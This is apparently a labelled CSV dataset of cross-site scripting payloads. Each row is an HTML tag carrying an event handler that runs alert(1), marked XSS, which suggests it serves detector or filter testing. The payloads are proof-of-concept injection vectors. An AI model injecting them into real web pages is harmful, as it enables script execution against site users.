payload,attack
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",XSS
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",XSS
"<footer onmousedown=""alert(1)"">test</footer>",XSS
"<footer onmouseenter=""alert(1)"">test</footer>",XSS
"<footer onmouseleave=""alert(1)"">test</footer>",XSS
"<footer onmousemove=""alert(1)"">test</footer>",XSS
"<footer onmouseout=""alert(1)"">test</footer>",XSS
"<footer onmouseover=""alert(1)"">test</footer>",XSS
"<footer onmouseup=""alert(1)"">test</footer>",XSS
"<footer onpaste=""alert(1)"" contenteditable>test</footer>",XSS
"<form draggable=""true"" ondrag=""alert(1)"">test</form>",XSS
"<form draggable=""true"" ondragend=""alert(1)"">test</form>",XSS
"<form draggable=""true"" ondragenter=""alert(1)"">test</form>",XSS
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",XSS
"<form draggable=""true"" ondragstart=""alert(1)"">test</form>",XSS
<form id=x tabindex=1 onactivate=alert(1)></form>,XSS
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>,XSS
<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>,XSS
<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>,XSS
<form id=x tabindex=1 onfocus=alert(1)></form>,XSS
<form id=x tabindex=1 onfocusin=alert(1)></form>,XSS
"<form onbeforecopy=""alert(1)"" contenteditable>test</form>",XSS
"<form onbeforecut=""alert(1)"" contenteditable>test</form>",XSS
"<form onbeforepaste=""alert(1)"" contenteditable>test</form>",XSS
<form onblur=alert(1) tabindex=1 id=x></form><input autofocus>,XSS
"<form onclick=""alert(1)"">test</form>",XSS
"<form oncontextmenu=""alert(1)"">test</form>",XSS
"<form oncopy=""alert(1)"" contenteditable>test</form>",XSS
"<form oncut=""alert(1)"" contenteditable>test</form>",XSS
"<form ondblclick=""alert(1)"">test</form>",XSS
<form onfocusout=alert(1) tabindex=1 id=x></form><input autofocus>,XSS
"<form onkeydown=""alert(1)"" contenteditable>test</form>",XSS
"<form onkeypress=""alert(1)"" contenteditable>test</form>",XSS
"<form onkeyup=""alert(1)"" contenteditable>test</form>",XSS
"<form onmousedown=""alert(1)"">test</form>",XSS
"<form onmouseenter=""alert(1)"">test</form>",XSS
"<form onmouseleave=""alert(1)"">test</form>",XSS
"<form onmousemove=""alert(1)"">test</form>",XSS
"<form onmouseout=""alert(1)"">test</form>",XSS
"<form onmouseover=""alert(1)"">test</form>",XSS
"<form onmouseup=""alert(1)"">test</form>",XSS
"<form onpaste=""alert(1)"" contenteditable>test</form>",XSS
<form onreset=alert(1)><input type=reset>,XSS
<form onsubmit=alert(1)><input type=submit>,XSS
<form><input oninvalid=alert(1) required><input type=submit>,XSS
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",XSS
<form><textarea oninvalid=alert(1) required><input type=submit>,XSS
"<frame draggable=""true"" ondrag=""alert(1)"">test</frame>",XSS
"<frame draggable=""true"" ondragend=""alert(1)"">test</frame>",XSS
"<frame draggable=""true"" ondragenter=""alert(1)"">test</frame>",XSS
"<frame draggable=""true"" ondragleave=""alert(1)"">test</frame>",XSS
"<frame draggable=""true"" ondragstart=""alert(1)"">test</frame>",XSS
<frame id=x tabindex=1 onactivate=alert(1)></frame>,XSS
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,XSS
<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>,XSS
<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>,XSS
"<frame onbeforecopy=""alert(1)"" contenteditable>test</frame>",XSS
"<frame onbeforecut=""alert(1)"" contenteditable>test</frame>",XSS
"<frame onbeforepaste=""alert(1)"" contenteditable>test</frame>",XSS
<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>,XSS
"<frame onclick=""alert(1)"">test</frame>",XSS
"<frame oncontextmenu=""alert(1)"">test</frame>",XSS
"<frame oncopy=""alert(1)"" contenteditable>test</frame>",XSS
"<frame oncut=""alert(1)"" contenteditable>test</frame>",XSS
"<frame ondblclick=""alert(1)"">test</frame>",XSS
<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>,XSS
"<frame onkeydown=""alert(1)"" contenteditable>test</frame>",XSS
"<frame onkeypress=""alert(1)"" contenteditable>test</frame>",XSS
"<frame onkeyup=""alert(1)"" contenteditable>test</frame>",XSS
"<frame onmousedown=""alert(1)"">test</frame>",XSS
"<frame onmouseenter=""alert(1)"">test</frame>",XSS
"<frame onmouseleave=""alert(1)"">test</frame>",XSS
"<frame onmousemove=""alert(1)"">test</frame>",XSS
"<frame onmouseout=""alert(1)"">test</frame>",XSS
"<frame onmouseover=""alert(1)"">test</frame>",XSS
"<frame onmouseup=""alert(1)"">test</frame>",XSS
"<frame onpaste=""alert(1)"" contenteditable>test</frame>",XSS
"<frameset draggable=""true"" ondrag=""alert(1)"">test</frameset>",XSS
"<frameset draggable=""true"" ondragend=""alert(1)"">test</frameset>",XSS
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",XSS
"<frameset draggable=""true"" ondragleave=""alert(1)"">test</frameset>",XSS
"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",XSS
<frameset id=x tabindex=1 onactivate=alert(1)></frameset>,XSS
<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>,XSS
<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>,XSS
<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>,XSS
<frameset id=x tabindex=1 onfocus=alert(1)></frameset>,XSS
<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>,XSS
"<frameset onbeforecopy=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset onbeforecut=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset onbeforepaste=""alert(1)"" contenteditable>test</frameset>",XSS
<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>,XSS
"<frameset onclick=""alert(1)"">test</frameset>",XSS
"<frameset oncontextmenu=""alert(1)"">test</frameset>",XSS
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset oncut=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset ondblclick=""alert(1)"">test</frameset>",XSS
<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>,XSS
"<frameset onkeydown=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset onkeyup=""alert(1)"" contenteditable>test</frameset>",XSS
"<frameset onmousedown=""alert(1)"">test</frameset>",XSS
"<frameset onmouseenter=""alert(1)"">test</frameset>",XSS
"<frameset onmouseleave=""alert(1)"">test</frameset>",XSS
"<frameset onmousemove=""alert(1)"">test</frameset>",XSS
"<frameset onmouseout=""alert(1)"">test</frameset>",XSS
"<frameset onmouseover=""alert(1)"">test</frameset>",XSS
"<frameset onmouseup=""alert(1)"">test</frameset>",XSS
<frameset onpageshow=alert(1)>,XSS
"<frameset onpaste=""alert(1)"" contenteditable>test</frameset>",XSS
<frameset><frame id=x onfocus=alert(1)>,XSS
<frameset><frame id=x onfocusin=alert(1)>,XSS
<frameset><frame onload=alert(1)>,XSS
"<h1 draggable=""true"" ondrag=""alert(1)"">test</h1>",XSS
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",XSS
"<h1 draggable=""true"" ondragenter=""alert(1)"">test</h1>",XSS
"<h1 draggable=""true"" ondragleave=""alert(1)"">test</h1>",XSS
"<h1 draggable=""true"" ondragstart=""alert(1)"">test</h1>",XSS
<h1 id=x tabindex=1 onactivate=alert(1)></h1>,XSS
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>,XSS
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,XSS
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,XSS
<h1 id=x tabindex=1 onfocus=alert(1)></h1>,XSS
<h1 id=x tabindex=1 onfocusin=alert(1)></h1>,XSS
"<h1 onbeforecopy=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 onbeforecut=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 onbeforepaste=""alert(1)"" contenteditable>test</h1>",XSS
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,XSS
"<h1 onclick=""alert(1)"">test</h1>",XSS
"<h1 oncontextmenu=""alert(1)"">test</h1>",XSS
"<h1 oncopy=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 oncut=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 ondblclick=""alert(1)"">test</h1>",XSS
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,XSS
"<h1 onkeydown=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",XSS
"<h1 onmousedown=""alert(1)"">test</h1>",XSS
"<h1 onmouseenter=""alert(1)"">test</h1>",XSS
"<h1 onmouseleave=""alert(1)"">test</h1>",XSS
"<h1 onmousemove=""alert(1)"">test</h1>",XSS
"<h1 onmouseout=""alert(1)"">test</h1>",XSS
"<h1 onmouseover=""alert(1)"">test</h1>",XSS
"<h1 onmouseup=""alert(1)"">test</h1>",XSS
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",XSS
"<head draggable=""true"" ondrag=""alert(1)"">test</head>",XSS
"<head draggable=""true"" ondragend=""alert(1)"">test</head>",XSS
"<head draggable=""true"" ondragenter=""alert(1)"">test</head>",XSS
"<head draggable=""true"" ondragleave=""alert(1)"">test</head>",XSS
"<head draggable=""true"" ondragstart=""alert(1)"">test</head>",XSS
<head id=x tabindex=1 onactivate=alert(1)></head>,XSS
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>,XSS
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,XSS
<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>,XSS
<head id=x tabindex=1 onfocus=alert(1)></head>,XSS
<head id=x tabindex=1 onfocusin=alert(1)></head>,XSS
"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",XSS
"<head onbeforecut=""alert(1)"" contenteditable>test</head>",XSS
"<head onbeforepaste=""alert(1)"" contenteditable>test</head>",XSS
<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,XSS
"<head onclick=""alert(1)"">test</head>",XSS
"<head oncontextmenu=""alert(1)"">test</head>",XSS
"<head oncopy=""alert(1)"" contenteditable>test</head>",XSS
"<head oncut=""alert(1)"" contenteditable>test</head>",XSS
"<head ondblclick=""alert(1)"">test</head>",XSS
<head onfocusout=alert(1) tabindex=1 id=x></head><input autofocus>,XSS
"<head onkeydown=""alert(1)"" contenteditable>test</head>",XSS
"<head onkeypress=""alert(1)"" contenteditable>test</head>",XSS
"<head onkeyup=""alert(1)"" contenteditable>test</head>",XSS
"<head onmousedown=""alert(1)"">test</head>",XSS
"<head onmouseenter=""alert(1)"">test</head>",XSS
"<head onmouseleave=""alert(1)"">test</head>",XSS
"<head onmousemove=""alert(1)"">test</head>",XSS
"<head onmouseout=""alert(1)"">test</head>",XSS
"<head onmouseover=""alert(1)"">test</head>",XSS
"<head onmouseup=""alert(1)"">test</head>",XSS
"<head onpaste=""alert(1)"" contenteditable>test</head>",XSS
"<header draggable=""true"" ondrag=""alert(1)"">test</header>",XSS
"<header draggable=""true"" ondragend=""alert(1)"">test</header>",XSS
"<header draggable=""true"" ondragenter=""alert(1)"">test</header>",XSS
"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",XSS
"<header draggable=""true"" ondragstart=""alert(1)"">test</header>",XSS
<header id=x tabindex=1 onactivate=alert(1)></header>,XSS
<header id=x tabindex=1 onbeforeactivate=alert(1)></header>,XSS
<header id=x tabindex=1 onbeforedeactivate=alert(1)></header><input autofocus>,XSS
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,XSS
<header id=x tabindex=1 onfocus=alert(1)></header>,XSS
<header id=x tabindex=1 onfocusin=alert(1)></header>,XSS
"<header onbeforecopy=""alert(1)"" contenteditable>test</header>",XSS
"<header onbeforecut=""alert(1)"" contenteditable>test</header>",XSS
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>",XSS
<header onblur=alert(1) tabindex=1 id=x></header><input autofocus>,XSS
"<header onclick=""alert(1)"">test</header>",XSS
"<header oncontextmenu=""alert(1)"">test</header>",XSS
"<header oncopy=""alert(1)"" contenteditable>test</header>",XSS
"<header oncut=""alert(1)"" contenteditable>test</header>",XSS
"<header ondblclick=""alert(1)"">test</header>",XSS
<header onfocusout=alert(1) tabindex=1 id=x></header><input autofocus>,XSS
"<header onkeydown=""alert(1)"" contenteditable>test</header>",XSS
"<header onkeypress=""alert(1)"" contenteditable>test</header>",XSS
"<header onkeyup=""alert(1)"" contenteditable>test</header>",XSS
"<header onmousedown=""alert(1)"">test</header>",XSS
"<header onmouseenter=""alert(1)"">test</header>",XSS
"<header onmouseleave=""alert(1)"">test</header>",XSS
"<header onmousemove=""alert(1)"">test</header>",XSS
"<header onmouseout=""alert(1)"">test</header>",XSS
"<header onmouseover=""alert(1)"">test</header>",XSS
"<header onmouseup=""alert(1)"">test</header>",XSS
"<header onpaste=""alert(1)"" contenteditable>test</header>",XSS
"<hgroup draggable=""true"" ondrag=""alert(1)"">test</hgroup>",XSS
"<hgroup draggable=""true"" ondragend=""alert(1)"">test</hgroup>",XSS
"<hgroup draggable=""true"" ondragenter=""alert(1)"">test</hgroup>",XSS
"<hgroup draggable=""true"" ondragleave=""alert(1)"">test</hgroup>",XSS
"<hgroup draggable=""true"" ondragstart=""alert(1)"">test</hgroup>",XSS
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,XSS
<hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>,XSS
<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>,XSS
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,XSS
<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>,XSS
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,XSS
"<hgroup onbeforecopy=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup onbeforecut=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup onbeforepaste=""alert(1)"" contenteditable>test</hgroup>",XSS
<hgroup onblur=alert(1) tabindex=1 id=x></hgroup><input autofocus>,XSS
"<hgroup onclick=""alert(1)"">test</hgroup>",XSS
"<hgroup oncontextmenu=""alert(1)"">test</hgroup>",XSS
"<hgroup oncopy=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup oncut=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup ondblclick=""alert(1)"">test</hgroup>",XSS
<hgroup onfocusout=alert(1) tabindex=1 id=x></hgroup><input autofocus>,XSS
"<hgroup onkeydown=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup onkeypress=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup onkeyup=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hgroup onmousedown=""alert(1)"">test</hgroup>",XSS
"<hgroup onmouseenter=""alert(1)"">test</hgroup>",XSS
"<hgroup onmouseleave=""alert(1)"">test</hgroup>",XSS
"<hgroup onmousemove=""alert(1)"">test</hgroup>",XSS
"<hgroup onmouseout=""alert(1)"">test</hgroup>",XSS
"<hgroup onmouseover=""alert(1)"">test</hgroup>",XSS
"<hgroup onmouseup=""alert(1)"">test</hgroup>",XSS
"<hgroup onpaste=""alert(1)"" contenteditable>test</hgroup>",XSS
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",XSS
"<hr draggable=""true"" ondragend=""alert(1)"">test</hr>",XSS
"<hr draggable=""true"" ondragenter=""alert(1)"">test</hr>",XSS
"<hr draggable=""true"" ondragleave=""alert(1)"">test</hr>",XSS
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",XSS
<hr id=x tabindex=1 onactivate=alert(1)></hr>,XSS
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,XSS
<hr id=x tabindex=1 onbeforedeactivate=alert(1)></hr><input autofocus>,XSS
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>,XSS
<hr id=x tabindex=1 onfocus=alert(1)></hr>,XSS
<hr id=x tabindex=1 onfocusin=alert(1)></hr>,XSS
"<hr onbeforecopy=""alert(1)"" contenteditable>test</hr>",XSS
"<hr onbeforecut=""alert(1)"" contenteditable>test</hr>",XSS
"<hr onbeforepaste=""alert(1)"" contenteditable>test</hr>",XSS
<hr onblur=alert(1) tabindex=1 id=x></hr><input autofocus>,XSS
"<hr onclick=""alert(1)"">test</hr>",XSS
"<hr oncontextmenu=""alert(1)"">test</hr>",XSS
"<hr oncopy=""alert(1)"" contenteditable>test</hr>",XSS
"<hr oncut=""alert(1)"" contenteditable>test</hr>",XSS
"<hr ondblclick=""alert(1)"">test</hr>",XSS
<hr onfocusout=alert(1) tabindex=1 id=x></hr><input autofocus>,XSS
"<hr onkeydown=""alert(1)"" contenteditable>test</hr>",XSS
"<hr onkeypress=""alert(1)"" contenteditable>test</hr>",XSS
"<hr onkeyup=""alert(1)"" contenteditable>test</hr>",XSS
"<hr onmousedown=""alert(1)"">test</hr>",XSS
"<hr onmouseenter=""alert(1)"">test</hr>",XSS
"<hr onmouseleave=""alert(1)"">test</hr>",XSS
"<hr onmousemove=""alert(1)"">test</hr>",XSS
"<hr onmouseout=""alert(1)"">test</hr>",XSS
"<hr onmouseover=""alert(1)"">test</hr>",XSS
"<hr onmouseup=""alert(1)"">test</hr>",XSS
"<hr onpaste=""alert(1)"" contenteditable>test</hr>",XSS
"<html draggable=""true"" ondrag=""alert(1)"">test</html>",XSS
"<html draggable=""true"" ondragend=""alert(1)"">test</html>",XSS
"<html draggable=""true"" ondragenter=""alert(1)"">test</html>",XSS
"<html draggable=""true"" ondragleave=""alert(1)"">test</html>",XSS
"<html draggable=""true"" ondragstart=""alert(1)"">test</html>",XSS
<html id=x tabindex=1 onactivate=alert(1)></html>,XSS
<html id=x tabindex=1 onbeforeactivate=alert(1)></html>,XSS
<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>,XSS
<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>,XSS
<html id=x tabindex=1 onfocus=alert(1)></html>,XSS
<html id=x tabindex=1 onfocusin=alert(1)></html>,XSS
"<html onbeforecopy=""alert(1)"" contenteditable>test</html>",XSS
"<html onbeforecut=""alert(1)"" contenteditable>test</html>",XSS
"<html onbeforepaste=""alert(1)"" contenteditable>test</html>",XSS
<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>,XSS
"<html onclick=""alert(1)"">test</html>",XSS
"<html oncontextmenu=""alert(1)"">test</html>",XSS
"<html oncopy=""alert(1)"" contenteditable>test</html>",XSS
"<html oncut=""alert(1)"" contenteditable>test</html>",XSS
"<html ondblclick=""alert(1)"">test</html>",XSS
<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>,XSS
"<html onkeydown=""alert(1)"" contenteditable>test</html>",XSS
"<html onkeypress=""alert(1)"" contenteditable>test</html>",XSS
"<html onkeyup=""alert(1)"" contenteditable>test</html>",XSS
"<html onmousedown=""alert(1)"">test</html>",XSS
"<html onmouseenter=""alert(1)"">test</html>",XSS
"<html onmouseleave=""alert(1)"">test</html>",XSS
"<html onmousemove=""alert(1)"">test</html>",XSS
"<html onmouseout=""alert(1)"">test</html>",XSS
"<html onmouseover=""alert(1)"">test</html>",XSS
"<html onmouseup=""alert(1)"">test</html>",XSS
"<html onpaste=""alert(1)"" contenteditable>test</html>",XSS
"<i draggable=""true"" ondrag=""alert(1)"">test</i>",XSS
"<i draggable=""true"" ondragend=""alert(1)"">test</i>",XSS
"<i draggable=""true"" ondragenter=""alert(1)"">test</i>",XSS
"<i draggable=""true"" ondragleave=""alert(1)"">test</i>",XSS
"<i draggable=""true"" ondragstart=""alert(1)"">test</i>",XSS
<i id=x tabindex=1 onactivate=alert(1)></i>,XSS
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,XSS
<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>,XSS
<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>,XSS
<i id=x tabindex=1 onfocus=alert(1)></i>,XSS
<i id=x tabindex=1 onfocusin=alert(1)></i>,XSS
"<i onbeforecopy=""alert(1)"" contenteditable>test</i>",XSS
"<i onbeforecut=""alert(1)"" contenteditable>test</i>",XSS
"<i onbeforepaste=""alert(1)"" contenteditable>test</i>",XSS
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,XSS
"<i onclick=""alert(1)"">test</i>",XSS
"<i oncontextmenu=""alert(1)"">test</i>",XSS
"<i oncopy=""alert(1)"" contenteditable>test</i>",XSS
"<i oncut=""alert(1)"" contenteditable>test</i>",XSS
"<i ondblclick=""alert(1)"">test</i>",XSS
<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>,XSS
"<i onkeydown=""alert(1)"" contenteditable>test</i>",XSS
"<i onkeypress=""alert(1)"" contenteditable>test</i>",XSS
"<i onkeyup=""alert(1)"" contenteditable>test</i>",XSS
"<i onmousedown=""alert(1)"">test</i>",XSS
"<i onmouseenter=""alert(1)"">test</i>",XSS
"<i onmouseleave=""alert(1)"">test</i>",XSS
"<i onmousemove=""alert(1)"">test</i>",XSS
"<i onmouseout=""alert(1)"">test</i>",XSS
"<i onmouseover=""alert(1)"">test</i>",XSS
"<i onmouseup=""alert(1)"">test</i>",XSS
"<i onpaste=""alert(1)"" contenteditable>test</i>",XSS
"<iframe draggable=""true"" ondrag=""alert(1)"">test</iframe>",XSS
"<iframe draggable=""true"" ondragend=""alert(1)"">test</iframe>",XSS
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",XSS
"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>",XSS
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",XSS
<iframe id=x onfocus=alert(1)>,XSS
<iframe id=x onfocusin=alert(1)>,XSS
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,XSS
<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>,XSS
<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,XSS
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,XSS
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe onbeforepaste=""alert(1)"" contenteditable>test</iframe>",XSS
<iframe onblur=alert(1) id=x><input autofocus>,XSS
"<iframe onclick=""alert(1)"">test</iframe>",XSS
"<iframe oncontextmenu=""alert(1)"">test</iframe>",XSS
"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe oncut=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe ondblclick=""alert(1)"">test</iframe>",XSS
<iframe onfocusout=alert(1) id=x><input autofocus>,XSS
"<iframe onkeydown=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",XSS
"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>",XSS
<iframe onload=alert(1)></iframe>,XSS
"<iframe onmousedown=""alert(1)"">test</iframe>",XSS
"<iframe onmouseenter=""alert(1)"">test</iframe>",XSS
"<iframe onmouseleave=""alert(1)"">test</iframe>",XSS
"<iframe onmousemove=""alert(1)"">test</iframe>",XSS
"<iframe onmouseout=""alert(1)"">test</iframe>",XSS
"<iframe onmouseover=""alert(1)"">test</iframe>",XSS
"<iframe onmouseup=""alert(1)"">test</iframe>",XSS
"<iframe onpaste=""alert(1)"" contenteditable>test</iframe>",XSS
<iframe onreadystatechange=alert(1)></iframe>,XSS
"<image draggable=""true"" ondrag=""alert(1)"">test</image>",XSS
"<image draggable=""true"" ondragend=""alert(1)"">test</image>",XSS
"<image draggable=""true"" ondragenter=""alert(1)"">test</image>",XSS
"<image draggable=""true"" ondragleave=""alert(1)"">test</image>",XSS
"<image draggable=""true"" ondragstart=""alert(1)"">test</image>",XSS
<image id=x tabindex=1 onactivate=alert(1)></image>,XSS
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>,XSS
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,XSS
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>,XSS
<image id=x tabindex=1 onfocus=alert(1)></image>,XSS
<image id=x tabindex=1 onfocusin=alert(1)></image>,XSS
"<image onbeforecopy=""alert(1)"" contenteditable>test</image>",XSS
"<image onbeforecut=""alert(1)"" contenteditable>test</image>",XSS
"<image onbeforepaste=""alert(1)"" contenteditable>test</image>",XSS
<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>,XSS
"<image onclick=""alert(1)"">test</image>",XSS
"<image oncontextmenu=""alert(1)"">test</image>",XSS
"<image oncopy=""alert(1)"" contenteditable>test</image>",XSS
"<image oncut=""alert(1)"" contenteditable>test</image>",XSS
"<image ondblclick=""alert(1)"">test</image>",XSS
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,XSS
"<image onkeydown=""alert(1)"" contenteditable>test</image>",XSS
"<image onkeypress=""alert(1)"" contenteditable>test</image>",XSS
"<image onkeyup=""alert(1)"" contenteditable>test</image>",XSS
"<image onmousedown=""alert(1)"">test</image>",XSS
"<image onmouseenter=""alert(1)"">test</image>",XSS
"<image onmouseleave=""alert(1)"">test</image>",XSS
"<image onmousemove=""alert(1)"">test</image>",XSS
"<image onmouseout=""alert(1)"">test</image>",XSS
"<image onmouseover=""alert(1)"">test</image>",XSS
"<image onmouseup=""alert(1)"">test</image>",XSS
"<image onpaste=""alert(1)"" contenteditable>test</image>",XSS
<image src/onerror=alert(1)>,XSS
<image src=validimage.png onload=alert(1)>,XSS
<image src=validimage.png onloadend=alert(1)>,XSS
<image src=validimage.png onloadstart=alert(1)>,XSS
<image srcset=1 onerror=alert(1)>,XSS
"<img draggable=""true"" ondrag=""alert(1)"">test</img>",XSS
"<img draggable=""true"" ondragend=""alert(1)"">test</img>",XSS
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",XSS
"<img draggable=""true"" ondragleave=""alert(1)"">test</img>",XSS
"<img draggable=""true"" ondragstart=""alert(1)"">test</img>",XSS
<img id=x tabindex=1 onactivate=alert(1)></img>,XSS
<img id=x tabindex=1 onbeforeactivate=alert(1)></img>,XSS
<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>,XSS
<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>,XSS
<img id=x tabindex=1 onfocus=alert(1)></img>,XSS
<img id=x tabindex=1 onfocusin=alert(1)></img>,XSS
"<img onbeforecopy=""alert(1)"" contenteditable>test</img>",XSS
"<img onbeforecut=""alert(1)"" contenteditable>test</img>",XSS
"<img onbeforepaste=""alert(1)"" contenteditable>test</img>",XSS
<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>,XSS
"<img onclick=""alert(1)"">test</img>",XSS
"<img oncontextmenu=""alert(1)"">test</img>",XSS
"<img oncopy=""alert(1)"" contenteditable>test</img>",XSS
"<img oncut=""alert(1)"" contenteditable>test</img>",XSS
"<img ondblclick=""alert(1)"">test</img>",XSS
<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>,XSS
"<img onkeydown=""alert(1)"" contenteditable>test</img>",XSS
"<img onkeypress=""alert(1)"" contenteditable>test</img>",XSS
